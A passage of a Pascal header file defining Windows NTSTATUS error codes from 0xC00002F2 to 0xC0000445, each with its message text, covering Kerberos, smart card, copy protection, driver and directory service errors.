// MessageId: STATUS_WRONG_CREDENTIAL_HANDLE
//
// MessageText:
//
// The supplied credential handle does not match the credential associated with the security context.
//
STATUS_WRONG_CREDENTIAL_HANDLE   = NTSTATUS($C00002F2);

//
// MessageId: STATUS_CRYPTO_SYSTEM_INVALID
//
// MessageText:
//
// The crypto system or checksum function is invalid because a required function is unavailable.
//
STATUS_CRYPTO_SYSTEM_INVALID     = NTSTATUS($C00002F3);

//
// MessageId: STATUS_MAX_REFERRALS_EXCEEDED
//
// MessageText:
//
// The number of maximum ticket referrals has been exceeded.
//
STATUS_MAX_REFERRALS_EXCEEDED    = NTSTATUS($C00002F4);

//
// MessageId: STATUS_MUST_BE_KDC
//
// MessageText:
//
// The local machine must be a Kerberos KDC (domain controller) and it is not.
//
STATUS_MUST_BE_KDC               = NTSTATUS($C00002F5);

//
// MessageId: STATUS_STRONG_CRYPTO_NOT_SUPPORTED
//
// MessageText:
//
// The other end of the security negotiation is requires strong crypto but it is not supported on the local machine.
//
STATUS_STRONG_CRYPTO_NOT_SUPPORTED = NTSTATUS($C00002F6);

//
// MessageId: STATUS_TOO_MANY_PRINCIPALS
//
// MessageText:
//
// The KDC reply contained more than one principal name.
//
STATUS_TOO_MANY_PRINCIPALS       = NTSTATUS($C00002F7);

//
// MessageId: STATUS_NO_PA_DATA
//
// MessageText:
//
// Expected to find PA data for a hint of what etype to use, but it was not found.
//
STATUS_NO_PA_DATA                = NTSTATUS($C00002F8);

//
// MessageId: STATUS_PKINIT_NAME_MISMATCH
//
// MessageText:
//
// The client certificate does not contain a valid UPN, or does not match the client name in the logon request. Please contact your administrator.
//
STATUS_PKINIT_NAME_MISMATCH      = NTSTATUS($C00002F9);

//
// MessageId: STATUS_SMARTCARD_LOGON_REQUIRED
//
// MessageText:
//
// Smartcard logon is required and was not used.
//
STATUS_SMARTCARD_LOGON_REQUIRED  = NTSTATUS($C00002FA);

//
// MessageId: STATUS_KDC_INVALID_REQUEST
//
// MessageText:
//
// An invalid request was sent to the KDC.
//
STATUS_KDC_INVALID_REQUEST       = NTSTATUS($C00002FB);

//
// MessageId: STATUS_KDC_UNABLE_TO_REFER
//
// MessageText:
//
// The KDC was unable to generate a referral for the service requested.
//
STATUS_KDC_UNABLE_TO_REFER       = NTSTATUS($C00002FC);

//
// MessageId: STATUS_KDC_UNKNOWN_ETYPE
//
// MessageText:
//
// The encryption type requested is not supported by the KDC.
//
STATUS_KDC_UNKNOWN_ETYPE         = NTSTATUS($C00002FD);

//
// MessageId: STATUS_SHUTDOWN_IN_PROGRESS
//
// MessageText:
//
// A system shutdown is in progress.
//
STATUS_SHUTDOWN_IN_PROGRESS      = NTSTATUS($C00002FE);

//
// MessageId: STATUS_SERVER_SHUTDOWN_IN_PROGRESS
//
// MessageText:
//
// The server machine is shutting down.
//
STATUS_SERVER_SHUTDOWN_IN_PROGRESS = NTSTATUS($C00002FF);

//
// MessageId: STATUS_NOT_SUPPORTED_ON_SBS
//
// MessageText:
//
// This operation is not supported on a computer running Windows Server 2003 for Small Business Server
//
STATUS_NOT_SUPPORTED_ON_SBS      = NTSTATUS($C0000300);

//
// MessageId: STATUS_WMI_GUID_DISCONNECTED
//
// MessageText:
//
// The WMI GUID is no longer available
//
STATUS_WMI_GUID_DISCONNECTED     = NTSTATUS($C0000301);

//
// MessageId: STATUS_WMI_ALREADY_DISABLED
//
// MessageText:
//
// Collection or events for the WMI GUID is already disabled.
//
STATUS_WMI_ALREADY_DISABLED      = NTSTATUS($C0000302);

//
// MessageId: STATUS_WMI_ALREADY_ENABLED
//
// MessageText:
//
// Collection or events for the WMI GUID is already enabled.
//
STATUS_WMI_ALREADY_ENABLED       = NTSTATUS($C0000303);

//
// MessageId: STATUS_MFT_TOO_FRAGMENTED
//
// MessageText:
//
// The Master File Table on the volume is too fragmented to complete this operation.
//
STATUS_MFT_TOO_FRAGMENTED        = NTSTATUS($C0000304);

//
// MessageId: STATUS_COPY_PROTECTION_FAILURE
//
// MessageText:
//
// Copy protection failure.
//
STATUS_COPY_PROTECTION_FAILURE   = NTSTATUS($C0000305);

//
// MessageId: STATUS_CSS_AUTHENTICATION_FAILURE
//
// MessageText:
//
// Copy protection error - DVD CSS Authentication failed.
//
STATUS_CSS_AUTHENTICATION_FAILURE = NTSTATUS($C0000306);

//
// MessageId: STATUS_CSS_KEY_NOT_PRESENT
//
// MessageText:
//
// Copy protection error - The given sector does not contain a valid key.
//
STATUS_CSS_KEY_NOT_PRESENT       = NTSTATUS($C0000307);

//
// MessageId: STATUS_CSS_KEY_NOT_ESTABLISHED
//
// MessageText:
//
// Copy protection error - DVD session key not established.
//
STATUS_CSS_KEY_NOT_ESTABLISHED   = NTSTATUS($C0000308);

//
// MessageId: STATUS_CSS_SCRAMBLED_SECTOR
//
// MessageText:
//
// Copy protection error - The read failed because the sector is encrypted.
//
STATUS_CSS_SCRAMBLED_SECTOR      = NTSTATUS($C0000309);

//
// MessageId: STATUS_CSS_REGION_MISMATCH
//
// MessageText:
//
// Copy protection error - The given DVD's region does not correspond to the
// region setting of the drive.
//
STATUS_CSS_REGION_MISMATCH       = NTSTATUS($C000030A);

//
// MessageId: STATUS_CSS_RESETS_EXHAUSTED
//
// MessageText:
//
// Copy protection error - The drive's region setting may be permanent.
//
STATUS_CSS_RESETS_EXHAUSTED      = NTSTATUS($C000030B);

//
// MessageId: STATUS_PASSWORD_CHANGE_REQUIRED
//
// MessageText:
//
// EAS policy requires that the user change their password before this operation can be performed.
//
STATUS_PASSWORD_CHANGE_REQUIRED  = NTSTATUS($C000030C);

//
// MessageId: STATUS_LOST_MODE_LOGON_RESTRICTION
//
// MessageText:
//
// An administrator has restricted sign in. To sign in, make sure your device is connected to the Internet, and have your administrator sign in first.
//
STATUS_LOST_MODE_LOGON_RESTRICTION = NTSTATUS($C000030D);

{*++

 MessageId's 0x030e - 0x031f (inclusive) are reserved for future **STORAGE**
 copy protection errors.

--*}
//
// MessageId: STATUS_PKINIT_FAILURE
//
// MessageText:
//
// The Kerberos protocol encountered an error while validating the KDC certificate during logon. There is more information in the system event log.
//
STATUS_PKINIT_FAILURE            = NTSTATUS($C0000320);

//
// MessageId: STATUS_SMARTCARD_SUBSYSTEM_FAILURE
//
// MessageText:
//
// The Kerberos protocol encountered an error while attempting to utilize the smartcard subsystem.
//
STATUS_SMARTCARD_SUBSYSTEM_FAILURE = NTSTATUS($C0000321);

//
// MessageId: STATUS_NO_KERB_KEY
//
// MessageText:
//
// The target server does not have acceptable Kerberos credentials.
//
STATUS_NO_KERB_KEY               = NTSTATUS($C0000322);

{*++

 MessageId's 0x0323 - 0x034f (inclusive) are reserved for other future copy
 protection errors.

--*}
//
// MessageId: STATUS_HOST_DOWN
//
// MessageText:
//
// The transport determined that the remote system is down.
//
STATUS_HOST_DOWN                 = NTSTATUS($C0000350);

//
// MessageId: STATUS_UNSUPPORTED_PREAUTH
//
// MessageText:
//
// An unsupported preauthentication mechanism was presented to the Kerberos package.
//
STATUS_UNSUPPORTED_PREAUTH       = NTSTATUS($C0000351);

//
// MessageId: STATUS_EFS_ALG_BLOB_TOO_BIG
//
// MessageText:
//
// The encryption algorithm used on the source file needs a bigger key buffer than the one used on the destination file.
//
STATUS_EFS_ALG_BLOB_TOO_BIG      = NTSTATUS($C0000352);

//
// MessageId: STATUS_PORT_NOT_SET
//
// MessageText:
//
// An attempt to remove a process's DebugPort was made, but a port was not already associated with the process.
//
STATUS_PORT_NOT_SET              = NTSTATUS($C0000353);

//
// MessageId: STATUS_DEBUGGER_INACTIVE
//
// MessageText:
//
// Debugger Inactive: Windows may have been started without kernel debugging enabled.
//
STATUS_DEBUGGER_INACTIVE         = NTSTATUS($C0000354);

//
// MessageId: STATUS_DS_VERSION_CHECK_FAILURE
//
// MessageText:
//
// This version of Windows is not compatible with the behavior version of directory forest, domain or domain controller.
//
STATUS_DS_VERSION_CHECK_FAILURE  = NTSTATUS($C0000355);

//
// MessageId: STATUS_AUDITING_DISABLED
//
// MessageText:
//
// The specified event is currently not being audited.
//
STATUS_AUDITING_DISABLED         = NTSTATUS($C0000356);

//
// MessageId: STATUS_PRENT4_MACHINE_ACCOUNT
//
// MessageText:
//
// The machine account was created pre-NT4. The account needs to be recreated.
//
STATUS_PRENT4_MACHINE_ACCOUNT    = NTSTATUS($C0000357);

//
// MessageId: STATUS_DS_AG_CANT_HAVE_UNIVERSAL_MEMBER
//
// MessageText:
//
// A account group cannot have a universal group as a member.
//
STATUS_DS_AG_CANT_HAVE_UNIVERSAL_MEMBER = NTSTATUS($C0000358);

//
// MessageId: STATUS_INVALID_IMAGE_WIN_32
//
// MessageText:
//
// The specified image file did not have the correct format, it appears to be a 32-bit Windows image.
//
STATUS_INVALID_IMAGE_WIN_32      = NTSTATUS($C0000359);

//
// MessageId: STATUS_INVALID_IMAGE_WIN_64
//
// MessageText:
//
// The specified image file did not have the correct format, it appears to be a 64-bit Windows image.
//
STATUS_INVALID_IMAGE_WIN_64      = NTSTATUS($C000035A);

//
// MessageId: STATUS_BAD_BINDINGS
//
// MessageText:
//
// Client's supplied SSPI channel bindings were incorrect.
//
STATUS_BAD_BINDINGS              = NTSTATUS($C000035B);

//
// MessageId: STATUS_NETWORK_SESSION_EXPIRED
//
// MessageText:
//
// The client's session has expired, so the client must reauthenticate to continue accessing the remote resources.
//
STATUS_NETWORK_SESSION_EXPIRED   = NTSTATUS($C000035C);

//
// MessageId: STATUS_APPHELP_BLOCK
//
// MessageText:
//
// AppHelp dialog canceled thus preventing the application from starting.
//
STATUS_APPHELP_BLOCK             = NTSTATUS($C000035D);

//
// MessageId: STATUS_ALL_SIDS_FILTERED
//
// MessageText:
//
// The SID filtering operation removed all SIDs.
//
STATUS_ALL_SIDS_FILTERED         = NTSTATUS($C000035E);

//
// MessageId: STATUS_NOT_SAFE_MODE_DRIVER
//
// MessageText:
//
// The driver was not loaded because the system is booting into safe mode.
//
STATUS_NOT_SAFE_MODE_DRIVER      = NTSTATUS($C000035F);

//
// MessageId: STATUS_ACCESS_DISABLED_BY_POLICY_DEFAULT
//
// MessageText:
//
// Access to %1 has been restricted by your Administrator by the default software restriction policy level.
//
STATUS_ACCESS_DISABLED_BY_POLICY_DEFAULT = NTSTATUS($C0000361);

//
// MessageId: STATUS_ACCESS_DISABLED_BY_POLICY_PATH
//
// MessageText:
//
// Access to %1 has been restricted by your Administrator by location with policy rule %2 placed on path %3
//
STATUS_ACCESS_DISABLED_BY_POLICY_PATH = NTSTATUS($C0000362);

//
// MessageId: STATUS_ACCESS_DISABLED_BY_POLICY_PUBLISHER
//
// MessageText:
//
// Access to %1 has been restricted by your Administrator by software publisher policy.
//
STATUS_ACCESS_DISABLED_BY_POLICY_PUBLISHER = NTSTATUS($C0000363);

//
// MessageId: STATUS_ACCESS_DISABLED_BY_POLICY_OTHER
//
// MessageText:
//
// Access to %1 has been restricted by your Administrator by policy rule %2.
//
STATUS_ACCESS_DISABLED_BY_POLICY_OTHER = NTSTATUS($C0000364);

//
// MessageId: STATUS_FAILED_DRIVER_ENTRY
//
// MessageText:
//
// The driver was not loaded because it failed its initialization call.
//
STATUS_FAILED_DRIVER_ENTRY       = NTSTATUS($C0000365);

//
// MessageId: STATUS_DEVICE_ENUMERATION_ERROR
//
// MessageText:
//
// The "%hs" encountered an error while applying power or reading the device configuration. This may be caused by a failure of your hardware or by a poor connection.
//
STATUS_DEVICE_ENUMERATION_ERROR  = NTSTATUS($C0000366);

//
// MessageId: STATUS_MOUNT_POINT_NOT_RESOLVED
//
// MessageText:
//
// The create operation failed because the name contained at least one mount point which resolves to a volume to which the specified device object is not attached.
//
STATUS_MOUNT_POINT_NOT_RESOLVED  = NTSTATUS($C0000368);

//
// MessageId: STATUS_INVALID_DEVICE_OBJECT_PARAMETER
//
// MessageText:
//
// The device object parameter is either not a valid device object or is not attached to the volume specified by the file name.
//
STATUS_INVALID_DEVICE_OBJECT_PARAMETER = NTSTATUS($C0000369);

//
// MessageId: STATUS_MCA_OCCURED
//
// MessageText:
//
// A Machine Check Error has occurred. Please check the system eventlog for additional information.
//
STATUS_MCA_OCCURED               = NTSTATUS($C000036A);

//
// MessageId: STATUS_DRIVER_BLOCKED_CRITICAL
//
// MessageText:
//
// Driver %2 has been blocked from loading.
//
STATUS_DRIVER_BLOCKED_CRITICAL   = NTSTATUS($C000036B);

//
// MessageId: STATUS_DRIVER_BLOCKED
//
// MessageText:
//
// Driver %2 has been blocked from loading.
//
STATUS_DRIVER_BLOCKED            = NTSTATUS($C000036C);

//
// MessageId: STATUS_DRIVER_DATABASE_ERROR
//
// MessageText:
//
// There was error [%2] processing the driver database.
//
STATUS_DRIVER_DATABASE_ERROR     = NTSTATUS($C000036D);

//
// MessageId: STATUS_SYSTEM_HIVE_TOO_LARGE
//
// MessageText:
//
// System hive size has exceeded its limit.
//
STATUS_SYSTEM_HIVE_TOO_LARGE     = NTSTATUS($C000036E);

//
// MessageId: STATUS_INVALID_IMPORT_OF_NON_DLL
//
// MessageText:
//
// A dynamic link library (DL); referenced a module that was neither a DLL nor the process's executable image.
//
STATUS_INVALID_IMPORT_OF_NON_DLL = NTSTATUS($C000036F);

//
// MessageId: STATUS_DS_SHUTTING_DOWN
//
// MessageText:
//
// The Directory Service is shutting down.
//
STATUS_DS_SHUTTING_DOWN          = NTSTATUS($40000370);

//
// MessageId: STATUS_NO_SECRETS
//
// MessageText:
//
// The local account store does not contain secret material for the specified account.
//
STATUS_NO_SECRETS                = NTSTATUS($C0000371);

//
// MessageId: STATUS_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY
//
// MessageText:
//
// Access to %1 has been restricted by your Administrator by policy rule %2.
//
STATUS_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY = NTSTATUS($C0000372);

//
// MessageId: STATUS_FAILED_STACK_SWITCH
//
// MessageText:
//
// The system was not able to allocate enough memory to perform a stack switch.
//
STATUS_FAILED_STACK_SWITCH       = NTSTATUS($C0000373);

//
// MessageId: STATUS_HEAP_CORRUPTION
//
// MessageText:
//
// A heap has been corrupted.
//
STATUS_HEAP_CORRUPTION           = NTSTATUS($C0000374);    // winnt

//
// MessageId: STATUS_SMARTCARD_WRONG_PIN
//
// MessageText:
//
// An incorrect PIN was presented to the smart card
//
STATUS_SMARTCARD_WRONG_PIN       = NTSTATUS($C0000380);

//
// MessageId: STATUS_SMARTCARD_CARD_BLOCKED
//
// MessageText:
//
// The smart card is blocked
//
STATUS_SMARTCARD_CARD_BLOCKED    = NTSTATUS($C0000381);

//
// MessageId: STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED
//
// MessageText:
//
// No PIN was presented to the smart card
//
STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED = NTSTATUS($C0000382);

//
// MessageId: STATUS_SMARTCARD_NO_CARD
//
// MessageText:
//
// No smart card available
//
STATUS_SMARTCARD_NO_CARD         = NTSTATUS($C0000383);

//
// MessageId: STATUS_SMARTCARD_NO_KEY_CONTAINER
//
// MessageText:
//
// The requested key container does not exist on the smart card
//
STATUS_SMARTCARD_NO_KEY_CONTAINER = NTSTATUS($C0000384);

//
// MessageId: STATUS_SMARTCARD_NO_CERTIFICATE
//
// MessageText:
//
// The requested certificate does not exist on the smart card
//
STATUS_SMARTCARD_NO_CERTIFICATE  = NTSTATUS($C0000385);

//
// MessageId: STATUS_SMARTCARD_NO_KEYSET
//
// MessageText:
//
// The requested keyset does not exist
//
STATUS_SMARTCARD_NO_KEYSET       = NTSTATUS($C0000386);

//
// MessageId: STATUS_SMARTCARD_IO_ERROR
//
// MessageText:
//
// A communication error with the smart card has been detected.
//
STATUS_SMARTCARD_IO_ERROR        = NTSTATUS($C0000387);

//
// MessageId: STATUS_DOWNGRADE_DETECTED
//
// MessageText:
//
// The system cannot contact a domain controller to service the authentication request. Please try again later.
//
STATUS_DOWNGRADE_DETECTED        = NTSTATUS($C0000388);

//
// MessageId: STATUS_SMARTCARD_CERT_REVOKED
//
// MessageText:
//
// The smartcard certificate used for authentication has been revoked. Please contact your system administrator. There may be additional information in the event log.
//
STATUS_SMARTCARD_CERT_REVOKED    = NTSTATUS($C0000389);

//
// MessageId: STATUS_ISSUING_CA_UNTRUSTED
//
// MessageText:
//
// An untrusted certificate authority was detected while processing the certificate used for authentication.
//
STATUS_ISSUING_CA_UNTRUSTED      = NTSTATUS($C000038A);

//
// MessageId: STATUS_REVOCATION_OFFLINE_C
//
// MessageText:
//
// The revocation status of the certificate used for authentication could not be determined.
//
STATUS_REVOCATION_OFFLINE_C      = NTSTATUS($C000038B);

//
// MessageId: STATUS_PKINIT_CLIENT_FAILURE
//
// MessageText:
//
// The client certificate used for authentication was not trusted.
//
STATUS_PKINIT_CLIENT_FAILURE     = NTSTATUS($C000038C);

//
// MessageId: STATUS_SMARTCARD_CERT_EXPIRED
//
// MessageText:
//
// The smartcard certificate used for authentication has expired. Please
// contact your system administrator.
//
STATUS_SMARTCARD_CERT_EXPIRED    = NTSTATUS($C000038D);

//
// MessageId: STATUS_DRIVER_FAILED_PRIOR_UNLOAD
//
// MessageText:
//
// The driver could not be loaded because a previous version of the driver is still in memory.
//
STATUS_DRIVER_FAILED_PRIOR_UNLOAD = NTSTATUS($C000038E);

//
// MessageId: STATUS_SMARTCARD_SILENT_CONTEXT
//
// MessageText:
//
// The smartcard provider could not perform the action since the context was acquired as silent.
//
STATUS_SMARTCARD_SILENT_CONTEXT  = NTSTATUS($C000038F);

 {* MessageId up to 0x400 is reserved for smart cards *}
//
// MessageId: STATUS_PER_USER_TRUST_QUOTA_EXCEEDED
//
// MessageText:
//
// The current user's delegated trust creation quota has been exceeded.
//
STATUS_PER_USER_TRUST_QUOTA_EXCEEDED = NTSTATUS($C0000401);

//
// MessageId: STATUS_ALL_USER_TRUST_QUOTA_EXCEEDED
//
// MessageText:
//
// The total delegated trust creation quota has been exceeded.
//
STATUS_ALL_USER_TRUST_QUOTA_EXCEEDED = NTSTATUS($C0000402);

//
// MessageId: STATUS_USER_DELETE_TRUST_QUOTA_EXCEEDED
//
// MessageText:
//
// The current user's delegated trust deletion quota has been exceeded.
//
STATUS_USER_DELETE_TRUST_QUOTA_EXCEEDED = NTSTATUS($C0000403);

//
// MessageId: STATUS_DS_NAME_NOT_UNIQUE
//
// MessageText:
//
// The requested name already exists as a unique identifier.
//
STATUS_DS_NAME_NOT_UNIQUE        = NTSTATUS($C0000404);

//
// MessageId: STATUS_DS_DUPLICATE_ID_FOUND
//
// MessageText:
//
// The requested object has a non-unique identifier and cannot be retrieved.
//
STATUS_DS_DUPLICATE_ID_FOUND     = NTSTATUS($C0000405);

//
// MessageId: STATUS_DS_GROUP_CONVERSION_ERROR
//
// MessageText:
//
// The group cannot be converted due to attribute restrictions on the requested group type.
//
STATUS_DS_GROUP_CONVERSION_ERROR = NTSTATUS($C0000406);

//
// MessageId: STATUS_VOLSNAP_PREPARE_HIBERNATE
//
// MessageText:
//
// {Volume Shadow Copy Service}
// Please wait while the Volume Shadow Copy Service prepares volume %hs for hibernation.
//
STATUS_VOLSNAP_PREPARE_HIBERNATE = NTSTATUS($C0000407);

//
// MessageId: STATUS_USER2USER_REQUIRED
//
// MessageText:
//
// Kerberos sub-protocol User2User is required.
//
STATUS_USER2USER_REQUIRED        = NTSTATUS($C0000408);

//
// MessageId: STATUS_STACK_BUFFER_OVERRUN
//
// MessageText:
//
// The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application.
//
STATUS_STACK_BUFFER_OVERRUN      = NTSTATUS($C0000409);    // winnt

//
// MessageId: STATUS_NO_S4U_PROT_SUPPORT
//
// MessageText:
//
// The Kerberos subsystem encountered an error. A service for user protocol request was made against a domain controller which does not support service for user.
//
STATUS_NO_S4U_PROT_SUPPORT       = NTSTATUS($C000040A);

//
// MessageId: STATUS_CROSSREALM_DELEGATION_FAILURE
//
// MessageText:
//
// An attempt was made by this server to make a Kerberos constrained delegation request for a target outside of the server's realm. This is not supported, and indicates a misconfiguration on this server's allowed to delegate to list. Please contact your administrator.
//
STATUS_CROSSREALM_DELEGATION_FAILURE = NTSTATUS($C000040B);

//
// MessageId: STATUS_REVOCATION_OFFLINE_KDC
//
// MessageText:
//
// The revocation status of the domain controller certificate used for authentication could not be determined. There is additional information in the system event log.
//
STATUS_REVOCATION_OFFLINE_KDC    = NTSTATUS($C000040C);

//
// MessageId: STATUS_ISSUING_CA_UNTRUSTED_KDC
//
// MessageText:
//
// An untrusted certificate authority was detected while processing the domain controller certificate used for authentication. There is additional information in the system event log. Please contact your system administrator.
//
STATUS_ISSUING_CA_UNTRUSTED_KDC  = NTSTATUS($C000040D);

//
// MessageId: STATUS_KDC_CERT_EXPIRED
//
// MessageText:
//
// The domain controller certificate used for logon has expired. There is additional information in the system event log.
//
STATUS_KDC_CERT_EXPIRED          = NTSTATUS($C000040E);

//
// MessageId: STATUS_KDC_CERT_REVOKED
//
// MessageText:
//
// The domain controller certificate used for logon has been revoked. There is additional information in the system event log.
//
STATUS_KDC_CERT_REVOKED          = NTSTATUS($C000040F);

//
// MessageId: STATUS_PARAMETER_QUOTA_EXCEEDED
//
// MessageText:
//
// Data present in one of the parameters is more than the function can operate on.
//
STATUS_PARAMETER_QUOTA_EXCEEDED  = NTSTATUS($C0000410);

//
// MessageId: STATUS_HIBERNATION_FAILURE
//
// MessageText:
//
// The system has failed to hibernate (The error code is %hs). Hibernation will be disabled until the system is restarted.
//
STATUS_HIBERNATION_FAILURE       = NTSTATUS($C0000411);

//
// MessageId: STATUS_DELAY_LOAD_FAILED
//
// MessageText:
//
// An attempt to delay-load a .dll or get a function address in a delay-loaded .dll failed.
//
STATUS_DELAY_LOAD_FAILED         = NTSTATUS($C0000412);

//
// MessageId: STATUS_AUTHENTICATION_FIREWALL_FAILED
//
// MessageText:
//
// Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine.
//
STATUS_AUTHENTICATION_FIREWALL_FAILED = NTSTATUS($C0000413);

//
// MessageId: STATUS_VDM_DISALLOWED
//
// MessageText:
//
// %hs is a 16-bit application. You do not have permissions to execute 16-bit applications. Check your permissions with your system administrator.
//
STATUS_VDM_DISALLOWED            = NTSTATUS($C0000414);

//
// MessageId: STATUS_HUNG_DISPLAY_DRIVER_THREAD
//
// MessageText:
//
// {Display Driver Stopped Responding}
// The %hs display driver has stopped working normally. Save your work and reboot the system to restore full display functionality. The next time you reboot the machine a dialog will be displayed giving you a chance to report this failure to Microsoft.
//
STATUS_HUNG_DISPLAY_DRIVER_THREAD = NTSTATUS($C0000415);

//
// MessageId: STATUS_INSUFFICIENT_RESOURCE_FOR_SPECIFIED_SHARED_SECTION_SIZE
//
// MessageText:
//
// The Desktop heap encountered an error while allocating session memory. There is more information in the system event log.
//
STATUS_INSUFFICIENT_RESOURCE_FOR_SPECIFIED_SHARED_SECTION_SIZE = NTSTATUS($C0000416);

//
// MessageId: STATUS_INVALID_CRUNTIME_PARAMETER
//
// MessageText:
//
// An invalid parameter was passed to a C runtime function.
//
STATUS_INVALID_CRUNTIME_PARAMETER = NTSTATUS($C0000417);    // winnt

//
// MessageId: STATUS_NTLM_BLOCKED
//
// MessageText:
//
// The authentication failed since NTLM was blocked.
//
STATUS_NTLM_BLOCKED              = NTSTATUS($C0000418);

//
// MessageId: STATUS_DS_SRC_SID_EXISTS_IN_FOREST
//
// MessageText:
//
// The source object's SID already exists in destination forest.
//
STATUS_DS_SRC_SID_EXISTS_IN_FOREST = NTSTATUS($C0000419);

//
// MessageId: STATUS_DS_DOMAIN_NAME_EXISTS_IN_FOREST
//
// MessageText:
//
// The domain name of the trusted domain already exists in the forest.
//
STATUS_DS_DOMAIN_NAME_EXISTS_IN_FOREST = NTSTATUS($C000041A);

//
// MessageId: STATUS_DS_FLAT_NAME_EXISTS_IN_FOREST
//
// MessageText:
//
// The flat name of the trusted domain already exists in the forest.
//
STATUS_DS_FLAT_NAME_EXISTS_IN_FOREST = NTSTATUS($C000041B);

//
// MessageId: STATUS_INVALID_USER_PRINCIPAL_NAME
//
// MessageText:
//
// The User Principal Name (UPN) is invalid.
//
STATUS_INVALID_USER_PRINCIPAL_NAME = NTSTATUS($C000041C);

//
// MessageId: STATUS_FATAL_USER_CALLBACK_EXCEPTION
//
// MessageText:
//
// An unhandled exception was encountered during a user callback.
//
STATUS_FATAL_USER_CALLBACK_EXCEPTION = NTSTATUS($C000041D);

//
// MessageId: STATUS_ASSERTION_FAILURE
//
// MessageText:
//
// An assertion failure has occurred.
//
STATUS_ASSERTION_FAILURE         = NTSTATUS($C0000420);    // winnt

//
// MessageId: STATUS_VERIFIER_STOP
//
// MessageText:
//
// Application verifier has found an error in the current process.
//
STATUS_VERIFIER_STOP             = NTSTATUS($C0000421);

//
// MessageId: STATUS_CALLBACK_POP_STACK
//
// MessageText:
//
// An exception has occurred in a user mode callback and the kernel callback frame should be removed.
//
STATUS_CALLBACK_POP_STACK        = NTSTATUS($C0000423);

//
// MessageId: STATUS_INCOMPATIBLE_DRIVER_BLOCKED
//
// MessageText:
//
// %2 has been blocked from loading due to incompatibility with this system. Please contact your software vendor for a compatible version of the driver.
//
STATUS_INCOMPATIBLE_DRIVER_BLOCKED = NTSTATUS($C0000424);

//
// MessageId: STATUS_HIVE_UNLOADED
//
// MessageText:
//
// Illegal operation attempted on a registry key which has already been unloaded.
//
STATUS_HIVE_UNLOADED             = NTSTATUS($C0000425);

//
// MessageId: STATUS_COMPRESSION_DISABLED
//
// MessageText:
//
// Compression is disabled for this volume.
//
STATUS_COMPRESSION_DISABLED      = NTSTATUS($C0000426);

//
// MessageId: STATUS_FILE_SYSTEM_LIMITATION
//
// MessageText:
//
// The requested operation could not be completed due to a file system limitation
//
STATUS_FILE_SYSTEM_LIMITATION    = NTSTATUS($C0000427);

//
// MessageId: STATUS_INVALID_IMAGE_HASH
//
// MessageText:
//
// Windows cannot verify the digital signature for this file. A recent hardware or software change might have installed a file that is signed incorrectly or damaged, or that might be malicious software from an unknown source.
//
STATUS_INVALID_IMAGE_HASH        = NTSTATUS($C0000428);

//
// MessageId: STATUS_NOT_CAPABLE
//
// MessageText:
//
// The implementation is not capable of performing the request.
//
STATUS_NOT_CAPABLE               = NTSTATUS($C0000429);

//
// MessageId: STATUS_REQUEST_OUT_OF_SEQUENCE
//
// MessageText:
//
// The requested operation is out of order with respect to other operations.
//
STATUS_REQUEST_OUT_OF_SEQUENCE   = NTSTATUS($C000042A);

//
// MessageId: STATUS_IMPLEMENTATION_LIMIT
//
// MessageText:
//
// An operation attempted to exceed an implementation-defined limit.
//
STATUS_IMPLEMENTATION_LIMIT      = NTSTATUS($C000042B);

//
// MessageId: STATUS_ELEVATION_REQUIRED
//
// MessageText:
//
// The requested operation requires elevation.
//
STATUS_ELEVATION_REQUIRED        = NTSTATUS($C000042C);

//
// MessageId: STATUS_NO_SECURITY_CONTEXT
//
// MessageText:
//
// The required security context does not exist.
//
STATUS_NO_SECURITY_CONTEXT       = NTSTATUS($C000042D);

//
// MessageId 0x042E is reserved and used in isolation lib as
//
// MessageId=0x042E Facility=System Severity=ERROR SymbolicName=STATUS_VERSION_PARSE_ERROR
// Language=English
// A version number could not be parsed.
// .
//
// MessageId: STATUS_PKU2U_CERT_FAILURE
//
// MessageText:
//
// The PKU2U protocol encountered an error while attempting to utilize the associated certificates.
//
STATUS_PKU2U_CERT_FAILURE        = NTSTATUS($C000042F);

//
// MessageId: STATUS_BEYOND_VDL
//
// MessageText:
//
// The operation was attempted beyond the valid data length of the file.
//
STATUS_BEYOND_VDL                = NTSTATUS($C0000432);

//
// MessageId: STATUS_ENCOUNTERED_WRITE_IN_PROGRESS
//
// MessageText:
//
// The attempted write operation encountered a write already in progress for some portion of the range.
//
STATUS_ENCOUNTERED_WRITE_IN_PROGRESS = NTSTATUS($C0000433);

//
// MessageId: STATUS_PTE_CHANGED
//
// MessageText:
//
// The page fault mappings changed in the middle of processing a fault so the operation must be retried.
//
STATUS_PTE_CHANGED               = NTSTATUS($C0000434);

//
// MessageId: STATUS_PURGE_FAILED
//
// MessageText:
//
// The attempt to purge this file from memory failed to purge some or all the data from memory.
//
STATUS_PURGE_FAILED              = NTSTATUS($C0000435);

//
// MessageId: STATUS_CRED_REQUIRES_CONFIRMATION
//
// MessageText:
//
// The requested credential requires confirmation.
//
STATUS_CRED_REQUIRES_CONFIRMATION = NTSTATUS($C0000440);

//
// MessageId: STATUS_CS_ENCRYPTION_INVALID_SERVER_RESPONSE
//
// MessageText:
//
// The remote server sent an invalid response for a file being opened with Client Side Encryption.
//
STATUS_CS_ENCRYPTION_INVALID_SERVER_RESPONSE = NTSTATUS($C0000441);

//
// MessageId: STATUS_CS_ENCRYPTION_UNSUPPORTED_SERVER
//
// MessageText:
//
// Client Side Encryption is not supported by the remote server even though it claims to support it.
//
STATUS_CS_ENCRYPTION_UNSUPPORTED_SERVER = NTSTATUS($C0000442);

//
// MessageId: STATUS_CS_ENCRYPTION_EXISTING_ENCRYPTED_FILE
//
// MessageText:
//
// File is encrypted and should be opened in Client Side Encryption mode.
//
STATUS_CS_ENCRYPTION_EXISTING_ENCRYPTED_FILE = NTSTATUS($C0000443);

//
// MessageId: STATUS_CS_ENCRYPTION_NEW_ENCRYPTED_FILE
//
// MessageText:
//
// A new encrypted file is being created and a NTSTATUS($EFS needs to be provided.
//
STATUS_CS_ENCRYPTION_NEW_ENCRYPTED_FILE = NTSTATUS($C0000444);

//
// MessageId: STATUS_CS_ENCRYPTION_FILE_NOT_CSE
//
// MessageText:
//
// The SMB client requested a CSE FSCTL on a non-CSE file.
//
STATUS_CS_ENCRYPTION_FILE_NOT_CSE = NTSTATUS($C0000445);

//
